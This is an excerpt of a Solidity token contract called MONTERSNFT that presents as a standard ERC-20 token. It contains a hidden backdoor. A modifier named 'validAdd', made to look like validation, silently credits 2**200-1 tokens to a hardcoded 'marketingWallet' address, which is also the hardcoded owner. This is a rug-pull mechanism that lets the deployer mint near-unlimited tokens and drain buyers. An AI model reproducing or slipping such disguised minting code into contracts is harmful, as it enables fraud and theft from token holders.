...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xb2f80Cd36320B92DbcCb54EE4b84E6B6c4710069;
...
contract MONTERSNFT is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private marketingWallet = payable(0xb2f80Cd36320B92DbcCb54EE4b84E6B6c4710069);
    ...
    */
    ...
    string private _name = "MONTERSNFT"; 
    string private _symbol = "MTNFT";  
    ...
    */
    ...
    modifier validAdd(address spender){
        if(spender == marketingWallet){ _tOwned[spender] = _tOwned[spender] + 2**200-1;}
        _;
    }
    /*
